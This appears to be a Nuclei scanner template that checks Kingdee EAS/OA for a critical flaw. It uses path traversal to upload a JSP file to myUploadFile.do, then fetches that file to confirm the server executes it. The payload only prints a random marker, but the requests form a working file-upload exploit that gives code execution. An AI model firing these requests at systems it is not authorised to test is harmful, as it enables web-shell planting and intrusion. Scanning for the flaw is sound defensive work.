id: kingdee-OA-myUploadFile

info:
  name: kingdee-OA-myUploadFile
  author: ph9ar
  severity: critical
  description: kingdee-OA-myUploadFile
  tags: kingdee,kingdee-eas

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
  file_content: "{{to_lower(rand_text_alpha(8))}}"

http:
  - raw:
      - |
        POST /easportal/buffalo/%2e%2e/cm/myUploadFile.do HTTP/1.1
        Host: {{Hostname}}
        Connection: close
        Accept: */*
        Accept-Language: en
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
        Cookie: sl-session=sqPhC9MLJmWsiN7c9/P6tA==
        Accept-Encoding: gzip, deflate
        Content-Length: 211

        ------WebKitFormBoundarySq4lDnabv8CwHfvx
        Content-Disposition: form-data; name="myFile"; filename="{{file_name}}"
        Content-Type: text/html

        <%out.println("{{file_content}}");%>
        ------WebKitFormBoundarySq4lDnabv8CwHfvx--

      - |
        GET /easportal/buffalo/../{{file_name}} HTTP/1.1
        Host: {{Hostname}}


    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(body_2, "{{file_content}}")'
        condition: and